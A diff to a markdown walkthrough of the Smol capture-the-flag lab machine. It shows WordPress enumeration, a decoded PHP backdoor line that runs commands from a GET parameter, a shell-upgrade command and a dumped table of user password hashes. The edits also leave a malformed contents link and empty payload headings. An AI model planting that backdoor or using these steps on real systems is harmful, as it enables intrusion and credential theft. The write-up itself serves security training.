@@ -5,14 +5,27 @@ This document provides a detailed walkthrough of how the Smol.thm machine was co
 
 ## Table of Contents
 
-1.  [Reconnaissance and Initial Enumeration](#1-reconnaissance-and-initial-enumeration)
-2.  [WordPress Vulnerabilities and Initial Access](#2-wordpress-vulnerabilities-and-initial-access)
-3.  [Gaining a Reverse Shell](#3-gaining-a-reverse-shell)
-4.  [Privilege Escalation to `diego`](#4-privilege-escalation-to-diego)
-5.  [Privilege Escalation to `think`](#5-privilege-escalation-to-think)
-6.  [Privilege Escalation to `xavi`](#6-privilege-escalation-to-xavi)
-7.  [Privilege Escalation to `root`](#7-privilege-escalation-to-root)
-8.  [Conclusion](#8-conclusion)
+[This is the link text](#Reconnaissance and Initial Enumeration)
+
+2. WordPress Vulnerabilities and Initial Access
+
+    XSS Vulnerability (Example Payload):
+
+    SSRF Vulnerability (Target Payload):
+
+3. Gaining a Reverse Shell
+
+4. Privilege Escalation to diego
+
+    Cracking diego's Password
+
+5. Privilege Escalation to think
+
+6. Privilege Escalation to xavi
+
+7. Privilege Escalation to root
+
+8. Conclusion
 
 # 1-reconnaissance-and-initial-enumeration
 
@@ -101,7 +114,8 @@ To specifically identify vulnerabilities within the WordPress installation, wpsc
 wpscan --url http://www.smol.thm --api-token REDACTED
 
 WPScan was instrumental in identifying potential vulnerabilities, leading to the discovery of the exploitable jsmol2wp plugin.
-# 2. WordPress Vulnerabilities and Initial Access
+
+# 2-wordpress-vulnerabilities-and-initial-access
 
 Further investigation focused on the WordPress installation, leveraging insights from wpscan to identify and exploit vulnerabilities.
 jsmol2wp Plugin Vulnerabilities
@@ -150,7 +164,8 @@ Which, after resolving the octal and hexadecimal escape sequences, translates to
 if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
 
 This backdoor allows for arbitrary command execution on the server by passing commands via the cmd GET parameter.
-# 3. Gaining a Reverse Shell
+
+# 3-gaining-a-reverse-shell
 
 With the command execution vulnerability confirmed, the next objective was to establish a persistent and interactive reverse shell on the target system.
 Crafting and Executing the Reverse Shell Payload
@@ -185,7 +200,8 @@ To gain a fully interactive shell, a Python PTY was spawned from the existing sh
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 This established a fully functional shell, ready for further enumeration and privilege escalation.
-# 4. Privilege Escalation to diego
+
+# 4-privilege-escalation-to-diego
 
 The next phase involved escalating privileges from the www-data user to a higher-privileged account.
 MySQL Database Access
@@ -210,7 +226,7 @@ The query returned the following user information and their password hashes:
 +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
 |  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
 |  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
-|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
+|  3 |       | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |          | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
 |  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
 |  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
 |  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
